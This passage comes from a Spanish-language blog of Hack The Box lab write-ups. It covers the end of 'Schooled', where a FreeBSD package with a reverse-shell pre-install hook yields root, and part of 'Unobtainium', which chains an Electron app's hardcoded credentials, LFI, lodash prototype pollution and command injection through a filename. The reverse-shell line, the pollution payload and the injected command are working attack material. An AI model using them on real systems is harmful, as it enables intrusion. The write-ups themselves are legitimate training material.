5.1.4 to 7.1.4... pkg: duplicate annotation: binary, ignoring [1/1] Extracting bash-7.1.4: 0% pkg: Directory //usr not specified in the manifest, skipping pkg: Directory //usr/local not specified in the manifest, skipping pkg: Directory //usr/local/man not specified in the manifest, skipping pkg: Directory //usr/local/share not specified in the manifest, skipping pkg: Directory //usr/local/libdata not specified in the manifest, skipping pkg: Directory //usr/local/lib not specified in the manifest, skipping pkg: Directory //usr/local/include not specified in the manifest, skipping pkg: Directory //usr/local/bin not specified in the manifest, skipping pkg: File //usr/local/bin/bashbug not specified in the manifest [1/1] Extracting bash-7.1.4: 100% jamie@Schooled:~/packages $ jamie@Schooled:~ $ ls -lah /home/jamie/root.txt -rw-r--r-- 1 root jamie 33B Apr 9 10:18 /home/jamie/root.txt jamie@Schooled:~ $ cat root.txt | cut -c1-15 269e8ad27983a7b jamie@Schooled:~ $ Shell - Root Utilizamos el mismo procedimiento para crear un nuevo paquete y repositorio, los cambios fueron en +MANIFEST donde agregamos una shell inversa y una version mayor a la ya instalada, este ultimo se agrego en +COMPACT_MANIFEST.\n1 2 3 4 \u0026#34;scripts\u0026#34;: { \u0026#34;pre-install\u0026#34;: \u0026#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet 10.10.14.145 1339 \u0026gt; /tmp/f\u0026#34;, ... , ... } Tras instalar el paquete logramos obtener una shell como root.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ╭─kali@kali ~/htb/schooled/repo2/packages ╰─➤ rlwrap nc -lvvp 1339 listening on [any] 1339 ... connect to [10.10.14.145] from schooled.htb [10.10.10.234] 13002 whoami;id;pwd root uid=0(root) gid=0(wheel) groups=0(wheel),5(operator) /usr/home/jamie/packages cd /root ls .cache .cshrc .history .k5login .lesshst .login .profile .shrc .ssh root.txt scripts cat root.txt | cut -c1-15 269e8ad27983a7b cat /home/jamie/user.txt | cut -c1-15 ecf7c6d61bfc9c8 LINKS ÙTILES\nhttps://github.com/freebsd/pkg http://flashback.sorbs.net/packages/freebsd:8:x86:64/All/ https://www.freebsd.org/cgi/man.cgi?query=pkg-repo\u0026amp;sektion=8\u0026amp;n=1 https://www.freebsd.org/cgi/man.cgi?pkg-create(8) ","description":"Schooled presenta una version de Moodle con una vulnerabilidad que permite escalar privilegios y además obtener acceso a la maquina tras la instalacion de un plugin. Creamos un repositorio utilizando PKG y un paquete para ejecutar comandos lo que nos dio acceso privilegiado.","id":50,"section":"posts","tags":["moodle","xss","pkg","pkg repo","freebsd"],"title":"Hack The Box - Schooled","uri":"https://sckull.github.io/posts/schooled/"},{"content":"\rEn Unobtainium, encontramos una aplicacion en Electron, el codigo fuente nos guio a multiples vulnerabilidades para explotar y obtener acceso. Tras una enumeracion notamos que es un entorno relacionado a Kubernetes, explotamos con un script las aplicaciones para acceder a informacion de acceso, con ello logramos escapar del contenedor y obtener acceso al host.\nNombre Unobtainium OS Linux Puntos 40 Dificultad Dificil IP 10.10.10.235 Maker felamos\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.9, 7.7, 5.5, 4.5, 2.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[5, 10, 1, 9, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon Masscan \u0026amp; Nmap Escaneo de puertos con nmap nos muestra multiples puertos abiertos: http/s (80, 31337, 10250), kubernetes(?) (8443), tcp (2379,2380), ssh (22).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 Starting masscan 1.3.2 (http://bit.ly/14GZzcT) at 2021-06-10 23:49:59 GMT Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 2380/tcp on 10.10.10.235 Discovered open port 10250/tcp on 10.10.10.235 Discovered open port 2379/tcp on 10.10.10.235 Discovered open port 80/tcp on 10.10.10.235 Discovered open port 22/tcp on 10.10.10.235 Discovered open port 31337/tcp on 10.10.10.235 Discovered open port 10256/tcp on 10.10.10.235 Discovered open port 8443/tcp on 10.10.10.235 Nmap scan report for unobtainium.htb (10.10.10.235) Host is up (0.073s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 e4:bf:68:42:e5:74:4b:06:58:78:bd:ed:1e:6a:df:66 (RSA) | 256 bd:88:a1:d9:19:a0:12:35:ca:d3:fa:63:76:48:dc:65 (ECDSA) |_ 256 cf:c4:19:25:19:fa:6e:2e:b7:a4:aa:7d:c3:f1:3d:9b (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Unobtainium 2379/tcp open ssl/etcd-client? | ssl-cert: Subject: commonName=unobtainium | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2021-01-17T07:10:30 |_Not valid after: 2022-01-17T07:10:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ h2 | tls-nextprotoneg: |_ h2 2380/tcp open ssl/etcd-server? | ssl-cert: Subject: commonName=unobtainium | Subject Alternative Name: DNS:localhost, DNS:unobtainium, IP Address:10.10.10.3, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1 | Not valid before: 2021-01-17T07:10:30 |_Not valid after: 2022-01-17T07:10:30 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ h2 | tls-nextprotoneg: |_ h2 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). | ssl-cert: Subject: commonName=unobtainium@1610865428 | Subject Alternative Name: DNS:unobtainium | Not valid before: 2021-01-17T05:37:08 |_Not valid after: 2022-01-17T05:37:08 |_ssl-date: TLS randomness does not represent time | tls-alpn: | h2 |_ http/1.1 10256/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) |_http-title: Site doesn\u0026#39;t have a title (text/plain; charset=utf-8). 31337/tcp open http Node.js Express framework | http-methods: |_ Potentially risky methods: PUT DELETE |_http-title: Site doesn\u0026#39;t have a title (application/json; charset=utf-8). 8443/tcp open ssl/https-alt | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Thu, 10 Jun 2021 21:29:09 GMT | Content-Length: 212 | {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot get path \u0026#34;/nice ports,/Trinity.txt.bak\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} | GenericLines: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Thu, 10 Jun 2021 21:29:08 GMT | Content-Length: 185 | {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot get path \u0026#34;/\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} | HTTPOptions: | HTTP/1.0 403 Forbidden | Cache-Control: no-cache, private | Content-Type: application/json | X-Content-Type-Options: nosniff | X-Kubernetes-Pf-Flowschema-Uid: 3082aa7f-e4b1-444a-a726-829587cd9e39 | X-Kubernetes-Pf-Prioritylevel-Uid: c4131e14-5fda-4a46-8349-09ccbed9efdd | Date: Thu, 10 Jun 2021 21:29:09 GMT | Content-Length: 189 |_ {\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;forbidden: User \u0026#34;system:anonymous\u0026#34; cannot options path \u0026#34;/\u0026#34;\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Forbidden\u0026#34;,\u0026#34;details\u0026#34;:{},\u0026#34;code\u0026#34;:403} |_http-title: Site doesn\u0026#39;t have a title (application/json). | ssl-cert: Subject: commonName=minikube/organizationName=system:masters | Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.10.235, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1 | Not valid before: 2021-06-09T20:33:11 |_Not valid after: 2022-06-10T20:33:11 |_ssl-date: TLS randomness does not represent time | tls-alpn: | h2 |_ http/1.1 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Web site Encontramos una pagina la cual muestra opciones para descarga de una “aplicacion” en diferentes formatos para sistemas linux.\nFeroxbuster Feroxbuster muestra directorios que se encuentran el index.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 π ~ ❯ feroxbuster -u http://10.10.10.235/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.2.1 ───────────────────────────┬────────────────────── 🎯 Target Url │ http://10.10.10.235/ 🚀 Threads │ 50 📖 Wordlist │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 👌 Status Codes │ [200, 204, 301, 302, 307, 308, 401, 403, 405] 💥 Timeout (secs) │ 7 🦡 User-Agent │ feroxbuster/2.2.1 💉 Config File │ /etc/feroxbuster/ferox-config.toml 🔃 Recursion Depth │ 4 🎉 New Version Available │ https://github.com/epi052/feroxbuster/releases/latest ───────────────────────────┴────────────────────── 🏁 Press [ENTER] to use the Scan Cancel Menu™ ────────────────────────────────────────────────── 301 9l 28w 316c http://10.10.10.235/downloads 301 9l 28w 313c http://10.10.10.235/images 403 9l 28w 277c http://10.10.10.235/server-status 301 9l 28w 313c http://10.10.10.235/assets 301 9l 28w 316c http://10.10.10.235/assets/js [#############\u0026gt;------] - 45m 769750/1102725 19m found:5 errors:46940 [####################] - 29m 220545/220545 126/s http://10.10.10.235/ [###################\u0026gt;] - 36m 218674/220545 100/s http://10.10.10.235/downloads [###############\u0026gt;----] - 31m 175048/220545 91/s http://10.10.10.235/images [###########\u0026gt;--------] - 25m 132105/220545 85/s http://10.10.10.235/assets [##\u0026gt;-----------------] - 4m 23374/220545 79/s http://10.10.10.235/assets/js Unobtainium APP Descargamos el programa que se muestra en la pagina principal con extension \u0026quot;.deb\u0026quot;, el archivo descargado es un zip, y contiene el paquete unobtainium_1.0.0_amd64.deb y archivo hash MD5.\n1 2 3 4 5 6 7 8 π ~/htb/unobtainium/tmp ❯ l total 105M drwxr-xr-x 3 kali kali 4.0K Jun 10 17:26 . drwxr-xr-x 5 kali kali 4.0K Jun 10 19:53 .. -rw-r--r-- 1 kali kali 53M Jan 19 01:16 unobtainium_1.0.0_amd64.deb -rw-r--r-- 1 kali kali 62 Mar 24 06:22 unobtainium_1.0.0_amd64.deb.md5sum -rw-r--r-- 1 kali kali 53M Mar 24 06:23 unobtainium_debian.zip π ~/htb/unobtainium/tmp ❯ Extract .DEB Utilizamos dpkg-deb para extraer el contenido del paquete, dentro encontramos la aplicacion opt/unobtainium/unobtainium, tambien el changelog.gz, además vemos un archivo app.asar.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 # dpkg-deb -xv unobtainium_1.0.0_amd64.deb extract/ π ~/htb/unobtainium/tmp/extract ❯ tree . ├── opt │ └── unobtainium │ ├── chrome_100_percent.pak │ ├── chrome_200_percent.pak │ ├── chrome-sandbox │ ├── icudtl.dat │ ├── libEGL.so │ ├── libffmpeg.so │ ├── libGLESv2.so │ ├── libvk_swiftshader.so │ ├── libvulkan.so │ ├── LICENSE.electron.txt │ ├── LICENSES.chromium.html │ ├── locales │ │ ├── am.pak │ │ ├── ar.pak [... REDACTED ...] │ ├── resources │ │ ├── app.asar │ ├── resources.pak │ ├── snapshot_blob.bin │ ├── swiftshader │ │ ├── libEGL.so │ │ └── libGLESv2.so │ ├── unobtainium │ ├── v8_context_snapshot.bin │ └── vk_swiftshader_icd.json └── usr └── share ├── applications │ └── unobtainium.desktop ├── doc │ └── unobtainium │ └── changelog.gz [... REDACTED ...] 28 directories, 97 files π ~/htb/unobtainium/tmp/extract ❯ Changelog El changelog solo muestra la version, el constructor (FPM) del paquete, un nombre de usuario (felamos) y un dominio (unobtainium.htb) el cual agregamos a nuestro archivo /etc/hosts.\n1 2 3 4 5 6 π ~/htb/unobtainium/tmp/extract/usr/share/doc/unobtainium ❯ cat changelog unobtainium (1.0.0) whatever; urgency=medium * Package created with FPM. -- felamos \u0026lt;felamos@unobtainium.htb\u0026gt; Mon, 18 Jan 2021 22:15:14 -0800 APP Al ejecutar unobtainium se muestra un mensaje acerca del dominio unobtainium.htb, un dashboard y multiples opciones.\nEnviar mensajes.\nUltimos mensajes.\nTras enviar un mensaje, este se muestra en Messaje Log en formato json.\n1 2 3 4 5 6 7 8 9 [ { \u0026#34;icon\u0026#34;:\u0026#34;__\u0026#34;, \u0026#34;text\u0026#34;:\u0026#34;sckull\u0026#34;, \u0026#34;id\u0026#34;:1, \u0026#34;timestamp\u0026#34;:1623363041476, \u0026#34;userName\u0026#34;:\u0026#34;felamos\u0026#34; } ] ToDo, se muestra una lista de cosas por hacer.\n1 2 3 4 { \u0026#34;ok\u0026#34;:true, \u0026#34;content\u0026#34;:\u0026#34;1. Create administrator zone.\\n2. Update node JS API Server.\\n3. Add Login functionality.\\n4. Complete Get Messages feature.\\n5. Complete ToDo feature.\\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\\n7. Improve security\\n\u0026#34; } Asar - Electron App En la carpeta resources/ se encuentra el archivo app.asar el cual esta relacionado a Electron, por lo que estrajimos los archivos utilizando asar, y con ello el codigo fuente de la aplicacion.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 # npx asar extract app.asar asar_extract/ π ~/htb/unobtainium/tmp/extract/opt/unobtainium/resources/asar_extract ❯ tree . ├── index.js ├── package.json └── src ├── css │ ├── bootstrap.min.css │ └── dashboard.css ├── get.html ├── index.html ├── js │ ├── app.js │ ├── bootstrap.bundle.min.js │ ├── Chart.min.js │ ├── check.js │ ├── dashboard.js │ ├── feather.min.js │ ├── get.js │ ├── jquery.min.js │ └── todo.js ├── post.html └── todo.html Codigo Fuente - APP En el codigo fuente encontramos solicitudes PUT, POST y GET hacia la direccion http://unobtainium.htb:31337/, vemos que realiza algun tipo de autenticacion junto con credenciales cuando envia mensajes, y estos son enviados en formato JSON, tambien se muestra una solicitud para la lectura de un archivo.\njavascript\rjavascript\rjavascript\rjavascript\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // app.js $(document).ready(function(){ $(\u0026#34;#but_submit\u0026#34;).click(function(){ var message = $(\u0026#34;#message\u0026#34;).val().trim(); $.ajax({ url: \u0026#39;http://unobtainium.htb:31337/\u0026#39;, type: \u0026#39;put\u0026#39;, dataType:\u0026#39;json\u0026#39;, contentType:\u0026#39;application/json\u0026#39;, processData: false, data: JSON.stringify({\u0026#34;auth\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34;}, \u0026#34;message\u0026#34;: {\u0026#34;text\u0026#34;: message}}), success: function(data) { //$(\u0026#34;#output\u0026#34;).html(JSON.stringify(data)); $(\u0026#34;#output\u0026#34;).html(\u0026#34;Message has been sent!\u0026#34;); } }); }); }); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 //check.js $.ajax({url: \u0026#34;http://unobtainium.htb:31337\u0026#34;, type: \u0026#34;HEAD\u0026#34;, timeout:1000, statusCode: { 200: function (response) { }, 400: function (response) { alert(\u0026#39;Unable to reach unobtainium.htb\u0026#39;); }, 0: function (response) { alert(\u0026#39;Unable to reach unobtainium.htb\u0026#39;); } } }); 1 2 3 4 5 6 7 8 9 //get.js $.ajax({ url: \u0026#39;http://unobtainium.htb:31337\u0026#39;, type: \u0026#39;get\u0026#39;, success: function(data) { $(\u0026#34;#output\u0026#34;).html(JSON.stringify(data)); } }); 1 2 3 4 5 6 7 8 9 10 11 12 //todo.js $.ajax({ url: \u0026#39;http://unobtainium.htb:31337/todo\u0026#39;, type: \u0026#39;post\u0026#39;, dataType:\u0026#39;json\u0026#39;, contentType:\u0026#39;application/json\u0026#39;, processData: false, data: JSON.stringify({\u0026#34;auth\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34;}, \u0026#34;filename\u0026#34; : \u0026#34;todo.txt\u0026#34;}), success: function(data) { $(\u0026#34;#output\u0026#34;).html(JSON.stringify(data)); } }); Unobtainium API LFI \u0026amp; Analisis - API Con el codigo fuente encontrado interactuamos con la API, principalmente en la solicitud POST para la lectura de archivos. Al no enviar ningun parametro obtuvimos un error en el que se muestra la direccion donde se encuentra la aplicacion (/usr/src/app/), el nombre del archivo de la aplicacion (index.js) y algunas librerias.\n1 2 3 4 5 6 7 8 9 10 11 12 # {\u0026#34;auth\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34;}, \u0026#34;filename\u0026#34; : \u0026#34;\u0026#34;} Error: ENOENT: no such file or directory, open at Object.openSync (fs.js:476:3) at Object.readFileSync (fs.js:377:35) at /usr/src/app/index.js:86:41 at Array.forEach (\u0026lt;anonymous\u0026gt;) at /usr/src/app/index.js:84:36 at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5) at next (/usr/src/app/node_modules/express/lib/router/route.js:137:13) at Route.dispatch (/usr/src/app/node_modules/express/lib/router/route.js:112:3) at Layer.handle [as handle_request] (/usr/src/app/node_modules/express/lib/router/layer.js:95:5) at /usr/src/app/node_modules/express/lib/router/index.js:281:22 Mediante la ruta /todo y el parametro filename obtuvimos acceso al codigo fuente de la aplicacion y el archivo package.json que contiene la descripcion y dependencias. En el codigo fuente encontramos:\nUn nombre de usuario: admin y, caracteristicas como: poder eliminar y subir archivos, las cuales el usuario felamos no tiene. Una funcion (findUser) para la anutenticacion de usuarios en users. Vemos la ruta (/upload) para subir archivos y un metodo (DELETE) para eliminar mensajes. Los archivos que pueden ser “leidos” deben de estar en /usr/src/app. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 // {\u0026#34;auth\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34;}, \u0026#34;filename\u0026#34; : \u0026#34;index.js\u0026#34;} var root = require(\u0026#34;google-cloudstorage-commands\u0026#34;); const express = require(\u0026#39;express\u0026#39;); const { exec } = require(\u0026#34;child_process\u0026#34;); const bodyParser = require(\u0026#39;body-parser\u0026#39;); const _ = require(\u0026#39;lodash\u0026#39;); const app = express(); var fs = require(\u0026#39;fs\u0026#39;); const users = [ {name: \u0026#39;felamos\u0026#39;, password: \u0026#39;Winter2021\u0026#39;}, {name: \u0026#39;admin\u0026#39;, password: Math.random().toString(32), canDelete: true, canUpload: true}, ]; let messages = []; let lastId = 1; function findUser(auth) { return users.find((u) =\u0026gt; u.name === auth.name \u0026amp;\u0026amp; u.password === auth.password); } app.use(bodyParser.json()); app.get(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { res.send(messages); }); app.put(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { const user = findUser(req.body.auth || {}); if (!user) { res.status(403).send({ ok: false, error: \u0026#39;Access denied\u0026#39; }); return; } const message = { icon: \u0026#39;__\u0026#39;, }; _.merge(message, req.body.message, { id: lastId++, timestamp: Date.now(), userName: user.name, }); messages.push(message); res.send({ ok: true }); }); app.delete(\u0026#39;/\u0026#39;, (req, res) =\u0026gt; { const user = findUser(req.body.auth || {}); if (!user || !user.canDelete) { res.status(403).send({ ok: false, error: \u0026#39;Access denied\u0026#39; }); return; } messages = messages.filter((m) =\u0026gt; m.id !== req.body.messageId); res.send({ ok: true }); }); app.post(\u0026#39;/upload\u0026#39;, (req, res) =\u0026gt; { const user = findUser(req.body.auth || {}); if (!user || !user.canUpload) { res.status(403).send({ ok: false, error: \u0026#39;Access denied\u0026#39; }); return; } filename = req.body.filename; root.upload(\u0026#34;./\u0026#34;, filename, true); res.send({ ok: true, Uploaded_File: filename }); }); app.post(\u0026#39;/todo\u0026#39;, (req, res) =\u0026gt; { const user = findUser(req.body.auth || {}); if(!user) { res.status(403).send({ ok: false, error: \u0026#39;Access denied\u0026#39; }); return; } filename = req.body.filename; testFolder = \u0026#34;/usr/src/app\u0026#34;; fs.readdirSync(testFolder).forEach(file =\u0026gt; { if (file.indexOf(filename) \u0026gt; -1) { var buffer = fs.readFileSync(filename).toString(); res.send({ ok: true, content: buffer }); } }); }); app.listen(3000); console.log(\u0026#39;Listening on port 3000...\u0026#39;); 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //{\u0026#34;auth\u0026#34;: {\u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34;}, \u0026#34;filename\u0026#34; : \u0026#34;package.json\u0026#34;} { \u0026#34;name\u0026#34;:\u0026#34;Unobtainium-Server\u0026#34;, \u0026#34;version\u0026#34;:\u0026#34;1.0.0\u0026#34;, \u0026#34;description\u0026#34;:\u0026#34;API Service for Electron client\u0026#34;, \u0026#34;main\u0026#34;:\u0026#34;index.js\u0026#34;, \u0026#34;scripts\u0026#34;:{ \u0026#34;start\u0026#34;:\u0026#34;node index.js\u0026#34; }, \u0026#34;author\u0026#34;:\u0026#34;felamos\u0026#34;, \u0026#34;license\u0026#34;:\u0026#34;ISC\u0026#34;, \u0026#34;dependencies\u0026#34;:{ \u0026#34;body-parser\u0026#34;:\u0026#34;1.18.3\u0026#34;, \u0026#34;express\u0026#34;:\u0026#34;4.16.4\u0026#34;, \u0026#34;lodash\u0026#34;:\u0026#34;4.17.4\u0026#34;, \u0026#34;google-cloudstorage-commands\u0026#34;:\u0026#34;0.0.1\u0026#34; }, \u0026#34;devDependencies\u0026#34;:{ } } EXPLOTACION LOCAL NPM Utilizamos estos dos archivos (index.js,packaje.json) para instalar las dependencias y ejecutar la aplicacion, aunque inicialmente se ejecuto npm audit, el cual mostró multiples vulnerabilidades en lodash\u0026lt;=4.17.20, una de estas calificada como alta.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 π ~/htb/unobtainium/tests ❯ npm audit # npm audit report lodash \u0026lt;=4.17.20 Severity: high Prototype Pollution - https://npmjs.com/advisories/1065 Prototype Pollution - https://npmjs.com/advisories/1523 Command Injection - https://npmjs.com/advisories/1673 Prototype Pollution - https://npmjs.com/advisories/577 Prototype Pollution - https://npmjs.com/advisories/782 fix available via `npm audit fix --force` Will install lodash@4.17.21, which is outside the stated dependency range node_modules/lodash 1 high severity vulnerability To address all issues, run: npm audit fix --force π ~/htb/unobtainium/tests ❯ Prototype Pollution Tras analizar el codigo fuente encontramos que el metodo .merge es vulnerable a Prototype Pollution (1, 2, 3, 4), por lo que es posible modificar un objeto.\n1 2 3 4 5 6 7 8 9 [ ... ] const _ = require(\u0026#39;lodash\u0026#39;); [ ... ] _.merge(message, req.body.message, { id: lastId++, timestamp: Date.now(), userName: user.name, }); [ ... ] Ejecutamos la aplicacion localmente para realizar varios tests, y, poder tomar ventaja de las caracteristicas del usuario admin con un payload modificando/dando los permisos a felamos.\n1 {\u0026#34;constructor\u0026#34;: {\u0026#34;prototype\u0026#34;: {\u0026#34;canDelete\u0026#34;: true, \u0026#34;canUpload\u0026#34;: true}}} Enviamos la solicitud junto con el payload con el metodo PUT a la direccion /.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 \u0026#34;PUT http://127.0.0.1:3000/\u0026#34; { \u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; }, \u0026#34;message\u0026#34;: { \u0026#34;constructor\u0026#34;: { \u0026#34;prototype\u0026#34;: { \u0026#34;canDelete\u0026#34;: true, \u0026#34;canUpload\u0026#34;: true } } } } Tras enviar la solicitud, verificamos que el usuario no obtuviera el mensaje \u0026quot;Access denied\u0026quot;. En la direccion /upload y con el metodo DELETE en /, se obtuvo un mensaje que indicaba que tenia acceso a estas direcciones.\n1 2 3 { \u0026#34;ok\u0026#34;: true } Command Injection La ruta /upload requiere un nombre de archivo, el cual es utilizado para subir archivos, aunque este utiliza google-cloudstorage-commands el cual tiene la vulnerabilidad de Command Injection la cual afecta a todas las versiones.\n1 2 3 4 5 var root = require(\u0026#34;google-cloudstorage-commands\u0026#34;); [...] filename = req.body.filename; root.upload(\u0026#34;./\u0026#34;, filename, true); [...] La explotacion es simple, solo requiere pasar un ampersand (\u0026amp;) seguido del comando a ejecutar.\n1 2 3 4 5 6 7 8 \u0026#34;POST http://127.0.0.1:3000/upload\u0026#34; { \u0026#34;auth\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;felamos\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;Winter2021\u0026#34; }, \u0026#34;filename\u0026#34;:\u0026#34;\u0026amp; touch cmd.txt\u0026#34; } Luego de enviar la solicitud, localmente se creo el archivo cmd.txt, por lo que \u0026ldquo;podriamos\u0026rdquo; ejecutar una shell inversa para obtener acceso.\n1 2 3 4 5 6 7 8 π ~/htb/unobtainium/tests ❯ ll total 48K -rw-r--r-- 1 kali kali 0 Jun 11 18:46 cmd.txt -rw-r--r-- 1 kali kali 2.8K Jun 11 18:35 index.js drwxr-xr-x 53 kali kali 4.0K Jun 11 18:03 node_modules -rw-r--r-- 1 kali kali 416 Jun 11 18:23 package.json -rw-r--r-- 1 kali kali 